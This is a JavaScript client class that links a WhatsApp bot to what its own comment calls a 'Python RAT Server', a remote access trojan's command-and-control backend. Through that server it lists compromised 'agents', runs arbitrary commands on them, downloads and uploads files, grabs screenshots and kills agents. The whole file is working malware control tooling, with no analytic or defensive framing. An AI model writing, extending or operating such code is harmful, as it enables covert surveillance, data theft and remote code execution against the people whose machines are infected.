import fetch from 'node-fetch';
import { ConfigLoader } from './configLoader.js';

/**
 * API Bridge Client - WhatsApp Bot to Python RAT Server
 * Communicates with Python rest_api_server.py via REST endpoints
 */
export class APIBridgeClient {
  constructor() {
    this.config = new ConfigLoader();
    this.baseUrl = `http://${this.config.getServer().listen_ip}:${this.config.getServer().api_port}/api`;
    this.timeout = 10000;
  }

  /**
   * Check server health
   */
  async health() {
    try {
      const response = await fetch(`${this.baseUrl}/health`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { status: 'error', message: error.message };
    }
  }

  /**
   * Get server statistics
   */
  async getStats() {
    try {
      const response = await fetch(`${this.baseUrl}/stats`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * List all connected agents
   */
  async listAgents() {
    try {
      const response = await fetch(`${this.baseUrl}/agents`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get agent details
   */
  async getAgent(agentId) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get agent status
   */
  async getAgentStatus(agentId) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}/status`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Execute command on agent
   */
  async executeCommand(agentId, command) {
    try {
      const response = await fetch(`${this.baseUrl}/command/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          agent_id: agentId, 
          command: command 
        }),
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get command history for agent
   */
  async getHistory(agentId) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}/history`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get alerts
   */
  async getAlerts() {
    try {
      const response = await fetch(`${this.baseUrl}/alerts`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Create alert
   */
  async createAlert(agentId, level, message) {
    try {
      const response = await fetch(`${this.baseUrl}/alerts`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          agent_id: agentId, 
          level: level, 
          message: message 
        }),
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get file from agent
   */
  async getFile(agentId, filePath) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}/file`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ path: filePath }),
        timeout: 30000
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Upload file to agent
   */
  async uploadFile(agentId, fileName, fileData) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}/upload`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          filename: fileName, 
          data: fileData 
        }),
        timeout: 30000
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get screenshot from agent
   */
  async getScreenshot(agentId) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}/screenshot`, {
        timeout: 30000
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Kill agent
   */
  async killAgent(agentId) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}/kill`, {
        method: 'POST',
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get server statistics with detailed breakdown
   */
  async getServerStats() {
    try {
      const response = await fetch(`${this.baseUrl}/stats`, {
        timeout: this.timeout
      });
      const data = await response.json();
      return {
        uptime: data.uptime,
        agents: data.agents,
        commands_executed: data.commands_executed,
        data_transferred: data.data_transferred,
        active_sessions: data.active_sessions,
        alerts_count: data.alerts_count
      };
    } catch (error) {
      return { error: error.message };
    }
  }
}
